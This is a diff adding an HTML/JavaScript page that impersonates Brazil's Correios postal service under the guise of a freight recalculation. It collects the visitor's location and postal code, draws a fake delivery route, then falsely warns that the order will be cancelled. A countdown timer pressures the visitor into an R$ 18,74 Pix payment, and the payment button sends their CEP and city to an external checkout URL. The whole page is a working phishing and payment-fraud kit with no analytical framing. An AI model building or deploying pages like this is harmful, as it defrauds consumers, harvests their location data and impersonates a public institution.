@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Correios • Recalculo de Frete</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* (todo o CSS permanece igual ao da última versão) */
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { background: #f0f2f5; font-family: 'Segoe UI', 'Tahoma', 'Geneva', 'Verdana', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+        .correios-header { background: #003366; padding: 12px 16px; display: flex; align-items: center; justify-content: space-between; gap: 12px; z-index: 10; flex-wrap: wrap; }
+        .logo-area img { height: 60px; width: auto; display: block; filter: brightness(0) invert(1); }
+        .correios-sub { font-size: 0.7rem; color: #ffcc00; font-weight: 600; background: rgba(0,0,0,0.2); padding: 4px 12px; border-radius: 40px; }
+        .map-container { flex: 1; position: relative; background: #e9ecef; }
+        #map { height: 100%; width: 100%; background: #cbd5e1; }
+        .search-card { position: absolute; top: 85px; left: 16px; right: 16px; background: white; border-radius: 20px; box-shadow: 0 6px 14px rgba(0,0,0,0.15); padding: 12px 16px; z-index: 1000; border: 1px solid #ffcc00; }
+        .search-label { font-size: 0.7rem; text-transform: uppercase; font-weight: bold; color: #003366; margin-bottom: 8px; display: flex; align-items: center; gap: 6px; }
+        .cep-group { display: flex; gap: 10px; align-items: center; }
+        .cep-group input { flex: 1; background: #fff; border: 1px solid #ccc; border-radius: 50px; padding: 12px 16px; font-size: 0.95rem; outline: none; font-weight: 500; color: #003366; }
+        .cep-group input:focus { border-color: #ffcc00; box-shadow: 0 0 0 2px rgba(255,204,0,0.3); }
+        .cep-group button { background: #003366; border: none; color: white; font-weight: bold; padding: 11px 18px; border-radius: 50px; cursor: pointer; display: flex; align-items: center; gap: 8px; transition: 0.2s; font-size: 0.85rem; white-space: nowrap; }
+        .cep-group button:active { background: #002244; transform: scale(0.96); }
+        .status-info { font-size: 0.7rem; color: #2c3e50; text-align: center; margin-top: 8px; background: #f0f0f3; border-radius: 30px; padding: 5px 12px; display: inline-block; width: auto; font-weight: 500; }
+        .recalc-overlay { position: absolute; bottom: 20px; left: 20px; right: 20px; background: white; border-radius: 28px; padding: 20px; z-index: 1001; display: flex; flex-direction: column; align-items: center; gap: 10px; border: 1px solid #ffcc00; box-shadow: 0 8px 25px rgba(0,0,0,0.2); text-align: center; }
+        .recalc-overlay.hide { display: none; }
+        .spinner-box { width: 48px; height: 48px; border: 4px solid #ffcc00; border-top: 4px solid #003366; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .recalc-text { font-weight: bold; font-size: 1rem; color: #003366; }
+        .recalc-sub { font-size: 0.75rem; color: #555; }
+        .upsell-popup { position: fixed; bottom: 0; left: 0; right: 0; background: white; border-radius: 28px 28px 0 0; box-shadow: 0 -8px 30px rgba(0,0,0,0.2); padding: 24px 20px 32px; z-index: 1050; transform: translateY(100%); transition: transform 0.35s cubic-bezier(0.2, 0.9, 0.4, 1.1); border-top: 5px solid #ffcc00; }
+        .upsell-popup.show { transform: translateY(0); }
+        .badge-offer { background: #d32f2f; color: white; font-weight: 800; font-size: 0.7rem; display: inline-flex; align-items: center; gap: 6px; padding: 5px 14px; border-radius: 40px; margin-bottom: 16px; }
+        .popup-title { font-size: 1.5rem; font-weight: 800; display: flex; align-items: center; gap: 10px; margin-bottom: 12px; color: #003366; }
+        .popup-desc { color: #333; font-size: 0.9rem; margin-bottom: 16px; line-height: 1.4; }
+        .countdown { background: #f0f2f5; padding: 10px; border-radius: 16px; text-align: center; margin-bottom: 20px; font-weight: bold; color: #d32f2f; }
+        .price-line { display: flex; align-items: baseline; gap: 12px; margin-bottom: 20px; background: #f0f2f5; padding: 12px 16px; border-radius: 24px; justify-content: space-between; flex-wrap: wrap; }
+        .price-original { text-decoration: line-through; color: #999; font-size: 0.9rem; }
+        .price-new { font-size: 1.8rem; font-weight: 800; color: #00a650; }
+        .btn-pix { background: #00a650; width: 100%; padding: 16px; border: none; border-radius: 60px; font-weight: 700; font-size: 1rem; color: white; display: flex; align-items: center; justify-content: center; gap: 10px; cursor: pointer; transition: 0.2s; }
+        .btn-pix:active { transform: scale(0.97); background: #007a3d; }
+        .close-upsell { position: absolute; top: 18px; right: 20px; background: #e9ecef; width: 32px; height: 32px; border-radius: 30px; display: flex; align-items: center; justify-content: center; cursor: pointer; color: #003366; }
+        .error-status { color: #d32f2f; }
+        .security-footer { display: flex; justify-content: center; gap: 16px; margin-top: 16px; font-size: 0.65rem; color: #4a5568; flex-wrap: wrap; }
+        @media (max-width: 480px) { .logo-area img { height: 48px; } .popup-title { font-size: 1.3rem; } .price-new { font-size: 1.5rem; } .cep-group input { padding: 10px 12px; font-size: 0.85rem; } .cep-group button { padding: 9px 14px; font-size: 0.75rem; } .search-card { top: 75px; padding: 10px 12px; } }
+    </style>
+</head>
+<body>
+    <div class="correios-header">
+        <div class="logo-area">
+            <img src="https://panela-tiktokshop.vercel.app/images/correios2-removebg-preview.png" alt="Correios">
+        </div>
+        <div class="correios-sub">Recálculo logístico</div>
+    </div>
+    <div class="map-container">
+        <div id="map"></div>
+        <div class="search-card">
+            <div class="search-label"><i class="fas fa-search"></i> CONFIRMAR ENDEREÇO</div>
+            <div class="cep-group">
+                <input type="text" id="cepInput" placeholder="Digite seu CEP" value="">
+                <button id="btnRastrear"><i class="fas fa-route"></i> Calcular frete</button>
+            </div>
+            <div class="status-info" id="statusMsg"><i class="fas fa-truck"></i> CD São Paulo • Rota em tempo real</div>
+        </div>
+        <div id="recalcOverlay" class="recalc-overlay hide">
+            <div class="spinner-box"></div>
+            <div class="recalc-text" id="recalcText"><i class="fas fa-sync-alt"></i> Recalculando frete...</div>
+            <div class="recalc-sub" id="recalcSub"><i class="fas fa-map-marked-alt"></i> Analisando rota do seu endereço</div>
+        </div>
+    </div>
+    <div id="upsellPopup" class="upsell-popup">
+        <div class="close-upsell" id="closeUpsell"><i class="fas fa-times"></i></div>
+        <div class="badge-offer"><i class="fas fa-exclamation-triangle"></i> FRETE GRÁTIS INDISPONÍVEL</div>
+        <div class="popup-title"><i class="fas fa-truck-ramp-box"></i> Seu pedido será cancelado!</div>
+        <div class="popup-desc" id="popupAddress"><i class="fas fa-location-dot"></i> Carregando endereço...</div>
+        <div class="countdown" id="countdownTimer"><i class="fas fa-hourglass-half"></i> Cancelamento em: 04:59</div>
+        <div class="price-line">
+            <span class="price-original">Valor real do frete: R$ 34,90</span>
+            <span class="price-new">Você paga: R$ 18,74</span>
+        </div>
+        <button class="btn-pix" id="btnFinalizar"><i class="fab fa-pix"></i> PAGAR R$ 18,74 E GARANTIR PRODUTO</button>
+        <div class="security-footer">
+            <span><i class="fas fa-lock"></i> Pagamento seguro</span>
+            <span><i class="fas fa-receipt"></i> Cobertura parcial</span>
+            <span><i class="fas fa-headset"></i> Dúvidas? Suporte</span>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            const CD = { lat: -23.5475, lng: -46.6361 };
+            let map = null;
+            let currentRouteLayer = null, animatingLine = null;
+            let lastDestCoords = null, lastCity = "";
+            let lastLogradouro = "";
+            let lastBairro = "";
+            let lastUsedCEP = null;
+            let countdownInterval = null;
+
+            function initMap() {
+                if (map) return;
+                map = L.map('map').setView([CD.lat, CD.lng], 9);
+                L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', {
+                    attribution: '&copy; OSM & CartoDB',
+                    subdomains: 'abcd'
+                }).addTo(map);
+                const cdIcon = L.divIcon({
+                    html: '<div style="background:#003366; width:34px; height:34px; border-radius:50%; border:2px solid #FFCC00; display:flex; align-items:center; justify-content:center;"><i class="fas fa-warehouse" style="color:white;"></i></div>',
+                    iconSize: [34,34],
+                    className: 'custom-icon'
+                });
+                L.marker([CD.lat, CD.lng], { icon: cdIcon }).addTo(map);
+            }
+            
+            function clearRoutes() {
+                if (currentRouteLayer) map.removeLayer(currentRouteLayer);
+                if (animatingLine) map.removeLayer(animatingLine);
+                currentRouteLayer = null;
+                animatingLine = null;
+            }
+            
+            function decodePolyline(encoded) {
+                let points = [], idx = 0, len = encoded.length, lat = 0, lng = 0;
+                while (idx < len) {
+                    let b, shift = 0, result = 0;
+                    do { b = encoded.charCodeAt(idx++) - 63; result |= (b & 0x1f) << shift; shift += 5; } while (b >= 0x20);
+                    let dlat = ((result & 1) ? ~(result >> 1) : (result >> 1));
+                    lat += dlat;
+                    shift = 0; result = 0;
+                    do { b = encoded.charCodeAt(idx++) - 63; result |= (b & 0x1f) << shift; shift += 5; } while (b >= 0x20);
+                    let dlng = ((result & 1) ? ~(result >> 1) : (result >> 1));
+                    lng += dlng;
+                    points.push([lat / 1e5, lng / 1e5]);
+                }
+                return points;
+            }
+            
+            async function animateRoute(points, duration = 2200) {
+                return new Promise((resolve) => {
+                    if (!points.length) { resolve(); return; }
+                    clearRoutes();
+                    if (points.length > 2) {
+                        currentRouteLayer = L.polyline(points, { color: '#FFCC00', weight: 3, opacity: 0.5, interactive: false }).addTo(map);
+                    }
+                    animatingLine = L.polyline([], { color: '#003366', weight: 5, opacity: 0.9, lineJoin: 'round' }).addTo(map);
+                    let step = 0, steps = points.length, start = performance.now();
+                    function frame(now) {
+                        let t = Math.min(1, (now - start) / duration);
+                        let target = Math.floor(t * steps);
+                        while (step <= target && step < steps) {
+                            animatingLine.addLatLng(points[step]);
+                            step++;
+                        }
+                        if (t < 1 && step < steps) requestAnimationFrame(frame);
+                        else resolve();
+                    }
+                    requestAnimationFrame(frame);
+                });
+            }
+            
+            async function getAddressFromViaCEP(cep) {
+                const clean = cep.replace(/\D/g, '');
+                if (clean.length !== 8) throw new Error('CEP inválido');
+                const resp = await fetch(`https://viacep.com.br/ws/${clean}/json/`);
+                const data = await resp.json();
+                if (data.erro) throw new Error('CEP não encontrado');
+                const logradouro = data.logradouro || '';
+                const bairro = data.bairro || '';
+                const cidade = data.localidade;
+                const uf = data.uf;
+                const query = `${cidade}, ${uf}, Brasil`;
+                return { query, cidade, uf, logradouro, bairro };
+            }
+            
+            async function geocodeByCity(cityUfQuery) {
+                const url = `https://nominatim.openstreetmap.org/search?q=${encodeURIComponent(cityUfQuery)}&format=json&limit=1&countrycodes=br&addressdetails=1`;
+                const resp = await fetch(url, { headers: { 'User-Agent': 'CorreiosApp/1.0' } });
+                const data = await resp.json();
+                if (!data || data.length === 0) throw new Error('Geocode falhou');
+                return { lat: parseFloat(data[0].lat), lng: parseFloat(data[0].lon) };
+            }
+            
+            async function reverseGeocode(lat, lng) {
+                const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`;
+                const resp = await fetch(url, { headers: { 'User-Agent': 'CorreiosApp/1.0' } });
+                const data = await resp.json();
+                if (data && data.address) {
+                    const cep = data.address.postcode;
+                    if (cep && cep.length >= 8) return cep.replace(/\D/g, '').substring(0, 8);
+                }
+                return null;
+            }
+            
+            async function getRoadRoute(start, end) {
+                try {
+                    const url = `https://router.project-osrm.org/route/v1/driving/${start.lng},${start.lat};${end.lng},${end.lat}?overview=full&geometries=polyline`;
+                    const resp = await fetch(url);
+                    const data = await resp.json();
+                    if (data.routes && data.routes.length) {
+                        const points = decodePolyline(data.routes[0].geometry);
+                        if (points.length > 1) return points.map(p => L.latLng(p[0], p[1]));
+                    }
+                    throw new Error('No OSRM route');
+                } catch (e) {
+                    const steps = 40;
+                    const points = [];
+                    for (let i = 0; i <= steps; i++) {
+                        const t = i / steps;
+                        const lat = start.lat + (end.lat - start.lat) * t;
+                        const lng = start.lng + (end.lng - start.lng) * t;
+                        points.push(L.latLng(lat, lng));
+                    }
+                    return points;
+                }
+            }
+            
+            function showOverlay(msg, sub) {
+                const ov = document.getElementById('recalcOverlay');
+                document.getElementById('recalcText').innerHTML = `<i class="fas fa-sync-alt"></i> ${msg}`;
+                document.getElementById('recalcSub').innerHTML = `<i class="fas fa-chart-line"></i> ${sub}`;
+                ov.classList.remove('hide');
+            }
+            function hideOverlay() { document.getElementById('recalcOverlay').classList.add('hide'); }
+            
+            function startCountdown(seconds = 300) {
+                let remaining = seconds;
+                const timerElement = document.getElementById('countdownTimer');
+                if (countdownInterval) clearInterval(countdownInterval);
+                countdownInterval = setInterval(() => {
+                    if (remaining <= 0) {
+                        clearInterval(countdownInterval);
+                        timerElement.innerHTML = '<i class="fas fa-ban"></i> Pedido cancelado! Recarregue a página.';
+                        document.getElementById('btnFinalizar').disabled = true;
+                        document.getElementById('btnFinalizar').style.opacity = '0.5';
+                    } else {
+                        const mins = Math.floor(remaining / 60);
+                        const secs = remaining % 60;
+                        timerElement.innerHTML = `<i class="fas fa-hourglass-half"></i> Cancelamento em: ${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+                        remaining--;
+                    }
+                }, 1000);
+            }
+            
+            function stopCountdown() {
+                if (countdownInterval) clearInterval(countdownInterval);
+            }
+            
+            function showUpsell(logradouro, bairro, cidade) {
+                let addressText = '';
+                if (logradouro && bairro) {
+                    addressText = `sua rua <strong>${logradouro}</strong> no bairro <strong>${bairro}</strong> (${cidade})`;
+                } else if (logradouro) {
+                    addressText = `sua rua <strong>${logradouro}</strong> (${cidade})`;
+                } else if (bairro) {
+                    addressText = `seu bairro <strong>${bairro}</strong> (${cidade})`;
+                } else {
+                    addressText = `sua região (${cidade})`;
+                }
+                document.getElementById('popupAddress').innerHTML = `<i class="fas fa-location-dot"></i> O frete grátis não se aplica à ${addressText}. Para evitar o cancelamento do pedido, confirme o pagamento do frete abaixo.`;
+                document.getElementById('upsellPopup').classList.add('show');
+                startCountdown(300);
+            }
+            
+            function hideUpsell() {
+                document.getElementById('upsellPopup').classList.remove('show');
+                stopCountdown();
+            }
+            
+            async function trackWithCEP(cep) {
+                hideUpsell();
+                if (!cep) return;
+                showOverlay("Recalculando frete...", "Analisando rota do seu endereço");
+                try {
+                    const { query, cidade, uf, logradouro, bairro } = await getAddressFromViaCEP(cep);
+                    lastCity = cidade;
+                    lastLogradouro = logradouro;
+                    lastBairro = bairro;
+                    document.getElementById('statusMsg').innerHTML = `<i class="fas fa-check-circle"></i> Endereço identificado: ${logradouro || 'Endereço'}, ${bairro || ''} - ${cidade}/${uf}`;
+                    showOverlay("Localizando coordenadas...", "Geocodificação");
+                    const coords = await geocodeByCity(query);
+                    lastDestCoords = coords;
+                    showOverlay("Traçando rota real...", "OSRM Routing");
+                    const routePoints = await getRoadRoute(CD, coords);
+                    const bounds = L.latLngBounds([CD, coords]);
+                    map.fitBounds(bounds, { padding: [60, 60] });
+                    const destIcon = L.divIcon({
+                        html: '<div style="background:#00a650; width:34px; height:34px; border-radius:50%; border:2px solid #FFCC00; display:flex; align-items:center; justify-content:center;"><i class="fas fa-flag-checkered" style="color:white;"></i></div>',
+                        iconSize: [34,34],
+                        className: 'custom-icon'
+                    });
+                    if (window.destMarker) map.removeLayer(window.destMarker);
+                    window.destMarker = L.marker([coords.lat, coords.lng], { icon: destIcon }).addTo(map);
+                    await animateRoute(routePoints, 2200);
+                    hideOverlay();
+                    showUpsell(logradouro, bairro, cidade);
+                    lastUsedCEP = cep;
+                } catch (err) {
+                    console.error(err);
+                    hideOverlay();
+                    document.getElementById('statusMsg').innerHTML = `<i class="fas fa-exclamation-triangle error-status"></i> Erro: CEP não localizado. Tente outro.`;
+                    alert("Não foi possível localizar seu CEP. Por favor, verifique o número digitado.");
+                }
+            }
+            
+            function requestLocationAndTrack() {
+                if (!navigator.geolocation) {
+                    document.getElementById('statusMsg').innerHTML = `<i class="fas fa-exclamation-triangle error-status"></i> Navegador sem geolocalização. Digite seu CEP.`;
+                    return;
+                }
+                showOverlay("Solicitando permissão...", "Ative a localização para calcular o frete");
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    showOverlay("Obtendo CEP pela localização...", "Buscando endereço");
+                    try {
+                        const cep = await reverseGeocode(lat, lng);
+                        if (cep) {
+                            await trackWithCEP(cep);
+                        } else {
+                            throw new Error("CEP não encontrado");
+                        }
+                    } catch (err) {
+                        hideOverlay();
+                        document.getElementById('statusMsg').innerHTML = `<i class="fas fa-exclamation-triangle error-status"></i> Não foi possível obter seu CEP. Digite manualmente.`;
+                        alert("Não identificamos seu CEP pela localização. Digite manualmente.");
+                    }
+                }, (error) => {
+                    hideOverlay();
+                    let msg = (error.code === 1) ? "Permissão negada. Digite seu CEP." : "Erro de localização. Digite seu CEP.";
+                    document.getElementById('statusMsg').innerHTML = `<i class="fas fa-exclamation-triangle error-status"></i> ${msg}`;
+                    alert(msg);
+                }, { enableHighAccuracy: true, timeout: 10000 });
+            }
+            
+            async function handleRastrear() {
+                const cep = document.getElementById('cepInput').value.trim();
+                if (cep) {
+                    await trackWithCEP(cep);
+                    return;
+                }
+                requestLocationAndTrack();
+            }
+            
+            function redirectToPix() {
+                const cep = lastUsedCEP || "desconhecido";
+                const url = `https://checkout.exemplo.com/pix?order_id=${Date.now()}&upsell=frete_priority&value=18.74&origin=correios_mapa&cep=${cep}&cidade=${encodeURIComponent(lastCity)}`;
+                window.location.href = url;
+            }
+            
+            window.addEventListener('DOMContentLoaded', () => {
+                initMap();
+                document.getElementById('btnRastrear').addEventListener('click', handleRastrear);
+                document.getElementById('btnFinalizar').addEventListener('click', redirectToPix);
+                document.getElementById('closeUpsell').addEventListener('click', hideUpsell);
+                document.getElementById('cepInput').addEventListener('keypress', (e) => { if (e.key === 'Enter') handleRastrear(); });
+                requestLocationAndTrack();
+            });
+        })();
+    </script>
+</body>
+</html>
